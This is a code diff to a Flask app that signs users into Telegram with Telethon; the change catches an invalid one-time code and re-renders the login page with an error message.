@@ -3,7 +3,8 @@ import asyncio
 from flask import Flask, render_template, request, redirect, url_for, session
 from telethon import TelegramClient
 from telethon.sessions import StringSession
-from telethon.errors import SessionPasswordNeededError
+# --- THE FIX: Import the specific errors we need to catch ---
+from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
 from supabase import create_client, Client
 
 # --- SECURE SETUP FOR DEPLOYMENT ---
@@ -70,6 +71,17 @@ def login():
                 await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
             elif password:
                 await client.sign_in(password=password)
+        
+        # --- THE FIX: Catch the specific error for a wrong OTP ---
+        except PhoneCodeInvalidError:
+            await client.disconnect()
+            # Re-render the OTP page but pass an error message to display
+            return render_template('login.html', 
+                                   step='enter_code', 
+                                   phone=phone, 
+                                   error="Invalid code. Please try again.")
+        # --- END OF FIX ---
+
         except SessionPasswordNeededError:
             session['telethon_session'] = client.session.save()
             await client.disconnect()
